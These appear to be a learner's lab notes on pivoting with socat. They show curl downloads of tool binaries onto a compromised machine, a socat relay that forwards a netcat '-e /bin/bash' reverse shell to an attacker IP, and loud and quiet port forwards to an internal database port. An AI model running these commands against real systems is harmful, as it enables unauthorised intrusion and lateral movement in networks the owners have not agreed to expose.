Not installed on the target machine, which means we have to install static binary for it.
we can also use encrypted version of Socat but it's not taught in this section.

What is Port Forwarding ?
![[Pasted image 20231223210031.png | 400]]
IP address is similar to phone number
Port no is similar to extension
So the IP address purpose is determined by the port number.

Socat ss a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations.

I have download the Socat file for Linux and fire up a web server here.
```
python3 -m http.server 8080
```

```
curl 10.200.105.200/socat -o /tmp/socat && chmod +x /tmp/socat
```
![[Pasted image 20231217175211.png]]

```
curl 10.50.106.240/socat-Sardarji -o socat-sardarji
```

<h2>Reverse Shell Relay </h2>
```
 ./socat-sardarji  tcp-l:8000 tcp:10.50.106.240:4444 &
socat linux binary  machine port       attacker IP and port
```

- `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
- `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
- `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

```
./nc-sardarji 127.0.0.1 8000 -e/bin/bash
```

Another method is 
<h2>Port Forwarding</h2>

```
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```
but in this method a port will be opened on the target machine which any one can spot in the network.

Port Forwarding Quiet
Attacker Machine
```
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```
![[Pasted image 20231223144949.png]]

Victim/Compromised Machine 
```
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```
